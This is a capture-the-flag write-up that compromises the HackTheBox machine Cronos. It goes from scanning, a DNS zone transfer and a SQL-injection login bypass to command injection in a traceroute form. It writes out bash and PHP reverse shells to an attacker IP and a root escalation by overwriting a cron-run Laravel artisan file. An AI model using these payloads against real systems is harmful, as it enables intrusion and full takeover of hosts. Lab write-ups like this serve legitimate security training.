Target : 10.129.4.148

Date : 28/05/2026

```bash
>  sudo echo "10.129.4.148 cronos.htb" | sudo tee -a /etc/hosts  
Please touch the FIDO authenticator.  
10.129.4.148 cronos.htb  
>  nmap -Pn -sV -sC -O -p- --min-rate=3000 10.129.4.148  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-28 12:32 +0200  
Nmap scan report for cronos.htb (10.129.4.148)  
Host is up (0.080s latency).  
Not shown: 65532 closed tcp ports (reset)  
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)  
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)  
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)  
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)  
| dns-nsid:    
|_  bind.version: 9.10.3-P4-Ubuntu  
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))  
|_http-title: Cronos  
|_http-server-header: Apache/2.4.18 (Ubuntu)  
Device type: general purpose  
Running: Linux 3.X|4.X  
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4  
OS details: Linux 3.10 - 4.11, Linux 3.13 - 4.4  
Network Distance: 2 hops  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 48.43 seconds
```

We see three ports open : ssh `22/tcp`, `80/tcp` `Apache httpd 2.4.18` and DNS `53/tcp` with the version `ISC BIND 9.10.3-P4`.

On the web application, we see documentation and github about  the `laravel` VPS.

```bash
>  curl -sI http://cronos.htb  
HTTP/1.1 200 OK  
Date: Thu, 28 May 2026 11:52:30 GMT  
Server: Apache/2.4.18 (Ubuntu)  
Cache-Control: no-cache, private  
Set-Cookie: XSRF-TOKEN=eyJpdiI6ImUwcVB1TFQ4SHYzZkQwT1A2VDBpdEE9PSIsInZhbHVlIjoiU2dKRFlsMWo2VlJ5QXA2bzlYXC9pRUgySHlNODViRlRtS2YycHV5TTFzQ2R1VXJxSXRWSitQNVVmS2h6ajFDVGMyN3YwMWsreHM3V2J5cEhSRVRXeEtRPT0iLCJtYWMiOiI  
xOTgyNmM4MGYyNjgxZGUwMTUyYzFhYjkzMWM3OTk2ODg0MDc1ZDhiOTAyYjYzZGNmNDk2Mzk0MmQyZTE1MmE1In0%3D; expires=Thu, 28-May-2026 13:52:30 GMT; Max-Age=7200; path=/  
Set-Cookie: laravel_session=eyJpdiI6IkpBVFwvVlhCRlBWRFFUVkx5dHlPVm5RPT0iLCJ2YWx1ZSI6IjF2RXlLcTJ5MVE5VTFOV0oxZmtqOWZcL1JnMU4yZ0NjWm1xV3ErSklaY2dJeXNzM3JWWURTM3czVDJRSkhmOHJsaHBKdExxVnNcL1M4WkdpUWRRWDkyZmc9PSIsIm  
1hYyI6IjVkZmE0ZWJjMzY2YTcwMTI0MjRlNDM0MzAwOTQ3YzE3YjNkYTRhYTc2N2VmMjFlYTk1NzIzMThiZDA5NDk0NDUifQ%3D%3D; expires=Thu, 28-May-2026 13:52:30 GMT; Max-Age=7200; path=/; HttpOnly  
Content-Type: text/html; charset=UTF-8

>  ffuf -u "http://cronos.htb/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -fc 404  
  
       /'___\  /'___\           /___\          
      /\ \__/ /\ \__/  __  __  /\ \__/          
      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\         
       \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/         
        \ \_\   \ \_\  \ \____/  \ \_\          
         \/_/    \/_/   \/___/    \/_/          
  
      v2.1.0-dev  
________________________________________________  
  
:: Method           : GET  
:: URL              : http://cronos.htb/FUZZ  
:: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt  
:: Follow redirects : false  
:: Calibration      : false  
:: Timeout          : 10  
:: Threads          : 40  
:: Matcher          : Response status: 200-299,301,302,307,401,403,405,500  
:: Filter           : Response status: 404  
________________________________________________  
  
js                      [Status: 301, Size: 305, Words: 20, Lines: 10, Duration: 484ms]  
css                     [Status: 301, Size: 306, Words: 20, Lines: 10, Duration: 4498ms]  
server-status           [Status: 403, Size: 298, Words: 22, Lines: 12, Duration: 60ms]  
:: Progress: [56162/56162] :: Job [1/1] :: 414 req/sec :: Duration: [0:02:18] :: Errors: 0 ::
```

We continue looking for domains :

```bash
>  curl -s http://cronos.htb:80/robots.txt  
User-agent: *  
Disallow:

>  ffuf -u "http://cronos.htb:80/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-small-files-lowercase.txt -fs 404  
  
       /'___\  /'___\           /___\          
      /\ \__/ /\ \__/  __  __  /\ \__/          
      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\         
       \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/         
        \ \_\   \ \_\  \ \____/  \ \_\          
         \/_/    \/_/   \/___/    \/_/          
  
      v2.1.0-dev  
________________________________________________  
  
:: Method           : GET  
:: URL              : http://cronos.htb:80/FUZZ  
:: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-files-lowercase.txt  
:: Follow redirects : false  
:: Calibration      : false  
:: Timeout          : 10  
:: Threads          : 40  
:: Matcher          : Response status: 200-299,301,302,307,401,403,405,500  
:: Filter           : Response size: 404  
________________________________________________  
  
index.php               [Status: 200, Size: 2319, Words: 990, Lines: 86, Duration: 140ms]  
favicon.ico             [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 260ms]  
.htaccess               [Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 63ms]  
web.config              [Status: 200, Size: 914, Words: 209, Lines: 24, Duration: 120ms]  
robots.txt              [Status: 200, Size: 24, Words: 2, Lines: 3, Duration: 70ms]  
.html                   [Status: 403, Size: 290, Words: 22, Lines: 12, Duration: 77ms]  
.php                    [Status: 403, Size: 289, Words: 22, Lines: 12, Duration: 233ms]  
.htpasswd               [Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 92ms]  
.htm                    [Status: 403, Size: 289, Words: 22, Lines: 12, Duration: 93ms]  
.htpasswds              [Status: 403, Size: 295, Words: 22, Lines: 12, Duration: 101ms]  
.htgroup                [Status: 403, Size: 293, Words: 22, Lines: 12, Duration: 82ms]  
wp-forum.phps           [Status: 403, Size: 298, Words: 22, Lines: 12, Duration: 79ms]  
.htaccess.bak           [Status: 403, Size: 298, Words: 22, Lines: 12, Duration: 78ms]  
.htuser                 [Status: 403, Size: 292, Words: 22, Lines: 12, Duration: 68ms]  
:: Progress: [10848/10848] :: Job [1/1] :: 526 req/sec :: Duration: [0:00:28] :: Errors: 0 ::

>  curl -sL http://cronos.htb:80/web.config  
<configuration>  
 <system.webServer>  
   <rewrite>  
     <rules>  
       <rule name="Imported Rule 1" stopProcessing="true">  
         <match url="^(.*)/$" ignoreCase="false" />  
         <conditions>  
           <add input="{REQUEST_FILENAME}" matchType="IsDirectory" ignoreCase="false" negate="true" />  
         </conditions>  
         <action type="Redirect" redirectType="Permanent" url="/{R:1}" />  
       </rule>  
       <rule name="Imported Rule 2" stopProcessing="true">  
         <match url="^" ignoreCase="false" />  
         <conditions>  
           <add input="{REQUEST_FILENAME}" matchType="IsDirectory" ignoreCase="false" negate="true" />  
           <add input="{REQUEST_FILENAME}" matchType="IsFile" ignoreCase="false" negate="true" />  
         </conditions>  
         <action type="Rewrite" url="index.php" />  
       </rule>  
     </rules>  
   </rewrite>  
 </system.webServer>  
</configuration>
```

Since `wp-forums.php` is `403` I doubt we can `curl` it but might as well try :

```bash
>  curl -sS http://cronos.htb:80/wp-forums.phps  
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">  
<html><head>  
<title>403 Forbidden</title>  
</head><body>  
<h1>Forbidden</h1>  
<p>You don't have permission to access /wp-forums.phps  
on this server.<br />  
</p>  
<hr>  
<address>Apache/2.4.18 (Ubuntu) Server at cronos.htb Port 80</address>  
</body></html>
```

And it's forbidden.

We pivot to the `53/tcp` DNS port, to see if there are any misconfigurations :

```bash
>  dig axfr @10.129.4.148 cronos.htb  
  
  
; <<>> DiG 9.20.23 <<>> axfr @10.129.4.148 cronos.htb  
; (1 server found)  
;; global options: +cmd  
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800  
cronos.htb.             604800  IN      NS      ns1.cronos.htb.  
cronos.htb.             604800  IN      A       10.10.10.13  
admin.cronos.htb.       604800  IN      A       10.10.10.13  
ns1.cronos.htb.         604800  IN      A       10.10.10.13  
www.cronos.htb.         604800  IN      A       10.10.10.13  
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800  
;; Query time: 67 msec  
;; SERVER: 10.129.4.148#53(10.129.4.148) (TCP)  
;; WHEN: Thu May 28 14:10:20 CEST 2026  
;; XFR size: 7 records (messages 1, bytes 203)
```

We've got a bunch of subdomains.

```bash
>  echo "10.129.4.148 cronos.htb admin.cronos.htb ns1.cronos.htb www.cronos.htb" | sudo tee -a /etc/hosts  
Please touch the FIDO authenticator.  
10.129.4.148 cronos.htb admin.cronos.htb ns1.cronos.htb www.cronos.htb

>  curl -sI admin.cronos.htb  
HTTP/1.1 200 OK  
Date: Thu, 28 May 2026 12:12:33 GMT  
Server: Apache/2.4.18 (Ubuntu)  
Set-Cookie: PHPSESSID=qd3ha1s6s7j98663ebqs4l00l5; path=/  
Expires: Thu, 19 Nov 1981 08:52:00 GMT  
Cache-Control: no-store, no-cache, must-revalidate  
Pragma: no-cache  
Content-Type: text/html; charset=UTF-8
```

And we got a PHPSESSID from the `admin` subdomain.

We go on the webpage, and we are greeted with a login page.

We try an SQLi : `' OR 1=1 --`, `admin'--`, didn't work.
But we try `admin'#` and it works.

We arrive at `http://admin.cronos.htb/welcome.php` where we get a traceroute.
We'll get it straight to our tun VPN IP with a listener on port 80 :

```bash
>  sudo nc -lvnp 80  
Please touch the FIDO authenticator.  
Listening on 0.0.0.0 80
```

The listener receives nothing. We ping, the website says :

We ping our tun VPN IP on the website and it says :
`PING 10.10.14.12 (10.10.14.12) 56(84) bytes of data.  
`64 bytes from 10.10.14.12: icmp_seq=1 ttl=63 time=64.7 ms` 
`1 packets transmitted, 1 received, 0% packet loss, time 0ms  
`rtt min/avg/max/mdev = 64.712/64.712/64.712/0.000 ms`

But the listener stays still.

We traceroute to the machine's IP which is home (127.0.0.1) and ask for id with `127.0.0.1; id` and it gives us : `uid=33(www-data) gid=33(www-data) groups=33(www-data)`
`whoami` gives us `www-data`

I'll stop the listener on port 80 and start listening on port 4444 :

```bash
>  nc -lvnp 4444  
  
Listening on 0.0.0.0 4444  
```

Then, on the web application, I'll use Remote Code Execution to bring 

```bash
127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.10.14.12/4444 0>&1'
```

```
Connection received on 10.129.4.148 47184  
bash: cannot set terminal process group (1376): Inappropriate ioctl for device  
bash: no job control in this shell  
www-data@cronos:/var/www/admin$ whoami
```
```bash
www-data@cronos:/var/www/admin$ find /home -name user.txt  
find /home -name user.txt  
/home/noulis/user.txt
www-data@cronos:/var/www/admin$ cd /home/noulis  
cd /home/noulis  
www-data@cronos:/home/noulis$ cat user.txt  
cat user.txt  
78e7*****************4cbe325
```

Since its name is Cronos, we can infer that the privesc is about cronjobs.

```bash
www-data@cronos:/var/www/admin$ cat /etc/crontab  
cat /etc/crontab  
# /etc/crontab: system-wide crontab  
# Unlike any other crontab you don't have to run the `crontab'  
# command to install the new version when you edit this file  
# and files in /etc/cron.d. These files also have username fields,  
# that none of the other crontabs do.  
  
SHELL=/bin/sh  
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin  
  
# m h dom mon dow user  command  
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly  
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )  
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )  
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )  
* * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
  
www-data@cronos:/var/www/admin$ ls -la /etc/cron*  
ls -la /etc/cron*  
-rw-r--r-- 1 root root  797 Apr  9  2017 /etc/crontab  
  
/etc/cron.d:  
total 24  
drwxr-xr-x  2 root root 4096 May 10  2022 .  
drwxr-xr-x 95 root root 4096 Jun 17  2022 ..  
-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder  
-rw-r--r--  1 root root  589 Jul 16  2014 mdadm  
-rw-r--r--  1 root root  670 Mar  1  2016 php  
-rw-r--r--  1 root root  191 Mar 22  2017 popularity-contest  
  
/etc/cron.daily:  
total 60  
drwxr-xr-x  2 root root 4096 May 10  2022 .  
drwxr-xr-x 95 root root 4096 Jun 17  2022 ..  
-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder  
-rwxr-xr-x  1 root root  539 Apr  6  2016 apache2  
-rwxr-xr-x  1 root root  376 Mar 31  2016 apport  
-rwxr-xr-x  1 root root 1474 Jan 17  2017 apt-compat  
-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils  
-rwxr-xr-x  1 root root 1597 Nov 27  2015 dpkg  
-rwxr-xr-x  1 root root  372 May  6  2015 logrotate  
-rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db  
-rwxr-xr-x  1 root root  539 Jul 16  2014 mdadm  
-rwxr-xr-x  1 root root  435 Nov 18  2014 mlocate  
-rwxr-xr-x  1 root root  249 Nov 13  2015 passwd  
-rwxr-xr-x  1 root root 3449 Feb 26  2016 popularity-contest  
-rwxr-xr-x  1 root root  214 May 24  2016 update-notifier-common  
  
/etc/cron.hourly:  
total 12  
drwxr-xr-x  2 root root 4096 May 10  2022 .  
drwxr-xr-x 95 root root 4096 Jun 17  2022 ..  
-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder  
  
/etc/cron.monthly:  
total 12  
drwxr-xr-x  2 root root 4096 May 10  2022 .  
drwxr-xr-x 95 root root 4096 Jun 17  2022 ..  
-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder  
  
/etc/cron.weekly:  
total 24  
drwxr-xr-x  2 root root 4096 May 10  2022 .  
drwxr-xr-x 95 root root 4096 Jun 17  2022 ..  
-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder  
-rwxr-xr-x  1 root root   86 Apr 13  2016 fstrim  
-rwxr-xr-x  1 root root  771 Nov  6  2015 man-db  
-rwxr-xr-x  1 root root  211 May 24  2016 update-notifier-common
```

Since `cronos.htb` was all about the `laravel` github and VPS, we will target it :

```bash
www-data@cronos:/var/www/admin$ ls -la /var/www/laravel/artisan  
ls -la /var/www/laravel/artisan  
-rwxr-xr-x 1 www-data www-data 1646 Apr  9  2017 /var/www/laravel/artisan  
www-data@cronos:/var/www/admin$ file /var/www/laravel/artisan  
file /var/www/laravel/artisan  
/var/www/laravel/artisan: a /usr/bin/env php script, ASCII text executable
```

We see we have a `/usr/bin/env` php script.

I open a `python http.server` :

```bash
>  python3 -m http.server 8000  
  
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

We create a `shell.php` script :

```bash
cat > /tmp/shell.php << 'EOF'

<?php

exec("bash -c 'bash -i >& /dev/tcp/10.10.14.12/4444 0>&1'");

?>

EOF
```

Then, we transfer it on the target :

```bash
www-data@cronos:/$ cp /tmp/shell.php /var/www/laravel/artisan  
cp /tmp/shell.php /var/www/laravel/artisan
```

We open a listener :

```bash
>  nc -lvnp 4444
Listening on 0.0.0.0 4444
```

Verify the frequency of cronjobs :

```bash
grep -v '^#' /etc/crontab | grep -v '^$'  
SHELL=/bin/sh  
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin  
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly  
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )  
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )  
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )  
* * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
```

After awhile, we receive the reverse shell through the cronjob executing the php script :

```bash
>  nc -lvnp 4444  
Listening on 0.0.0.0 4444  
Connection received on 10.129.4.148 47212  
bash: cannot set terminal process group (4074): Inappropriate ioctl for device  
bash: no job control in this shell  
root@cronos:~# cat /root/root.txt  
cat /root/root.txt  
5003f0***********ee0d9c3
```

And we get the root flag !
